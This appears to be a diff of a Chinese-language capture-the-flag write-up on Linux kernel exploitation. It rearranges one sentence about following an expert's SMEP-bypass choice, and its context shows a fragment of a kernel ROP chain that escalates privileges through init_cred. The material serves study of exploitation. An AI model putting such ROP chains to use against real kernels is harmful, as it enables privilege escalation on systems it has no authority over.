@@ -374,6 +374,8 @@ struct tty_operations {
 
 而本题不用`bypass-smep`，直接在栈上走ROP也是可以的
 
+只是佬这么用了，我就跟着用了
+
 ```c
     rop[p++] = POP_RDI_RET;
     rop[p++] = init_cred;
@@ -388,9 +390,8 @@ struct tty_operations {
     rop[p++] = user_ss;
 ```
 
-只是佬这么用了，我也跟着用了
-
 感谢佬https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/
+
 
 
 
